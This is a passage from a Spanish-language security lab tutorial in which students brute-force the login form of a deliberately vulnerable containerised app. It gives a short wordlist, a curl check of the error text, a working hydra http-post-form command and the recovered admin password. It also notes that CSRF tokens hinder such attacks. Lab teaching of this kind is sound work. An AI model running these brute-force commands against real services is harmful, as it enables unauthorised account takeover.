# Paso 4 — Fuerza bruta con hydra

Supongamos que no tuviéramos el código fuente ni acceso directo a MySQL — solo la pantalla de login de la app, en el puerto 8888. `hydra` prueba combinaciones de usuario/contraseña contra un servicio hasta encontrar una que funcione.

## 4.1 — ¿Por qué contra `/login` y no contra PhpMyAdmin?

PhpMyAdmin (puerto 8080) también tiene un formulario de login, pero incluye un token anti-CSRF que cambia en cada carga de página — eso rompe un ataque de fuerza bruta ingenuo, porque cada intento necesitaría un token nuevo. Nuestro `/login` no tiene esa protección, así que es un blanco más simple. Guardate esta diferencia: un token CSRF bien implementado también frena fuerza bruta.

## 4.2 — Armar una wordlist

`hydra` también vive en `toolbox`. La wordlist la escribimos directo dentro del contenedor (queda en `/tmp`, así que dura mientras `toolbox` siga corriendo):

```bash
printf '123456\npassword\nadmin\nqwerty\nletmein\nalumnos2024\nadmin123\n' | docker compose exec -T toolbox sh -c "cat > /tmp/wordlist.txt"
```

## 4.3 — Confirmar el mensaje de error

```bash
docker compose exec toolbox curl -s -d "usuario=admin&password=incorrecta" http://app:8888/login | grep -o "Usuario o contraseña incorrectos"
```

Ese texto es lo que `hydra` va a usar para saber si un intento falló.

## 4.4 — Ejecutar hydra

```bash
docker compose exec toolbox hydra -l admin -P /tmp/wordlist.txt app -s 8888 \
  http-post-form "/login:usuario=^USER^&password=^PASS^:incorrectos"
```

- `-l admin` → usuario fijo
- `-P /tmp/wordlist.txt` → lista de contraseñas a probar
- `app -s 8888` → contenedor y puerto objetivo (nombre de servicio, `toolbox` está en la misma red)
- `http-post-form "ruta:body:condición_de_fallo"` → le dice a hydra cómo arma el POST y cómo reconocer un intento fallido

## 4.5 — Leer el resultado

`hydra` debería reportar una línea como:

```
[8888][http-post-form] host: app   login: admin   password: admin123
```

Encontró la contraseña probando cada palabra de la wordlist, sin conocer el código ni la base de datos.

> Con reconocimiento (nmap), credenciales filtradas y fuerza bruta ya tenemos tres formas distintas de comprometer esta infraestructura. En la próxima práctica vamos a ver una cuarta: una inyección SQL en el login que ni siquiera necesita una wordlist.

---

**← Anterior:** [Paso 3](step3.md) | **Siguiente →** [Cierre](../finish.md)
